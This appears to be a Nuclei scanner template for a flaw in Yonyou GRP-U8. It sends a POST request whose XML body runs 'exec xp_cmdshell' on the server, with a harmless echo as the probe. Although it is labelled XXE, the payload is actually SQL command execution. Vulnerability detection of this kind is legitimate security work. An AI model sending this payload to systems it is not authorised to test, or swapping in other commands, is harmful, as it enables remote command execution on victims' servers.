id: yonyou-grp-u8-xxe

info:
  name: Yonyou GRP-U8 XXE
  author: pikpikcu
  severity: medium
  reference: https://blog.csdn.net/Adminxe/article/details/108744911

requests:
  - method: POST
    path:
      - "{{BaseURL}}/Proxy"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'echo nuclei'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "nuclei"
        part: body
      - type: status
        status:
          - 200
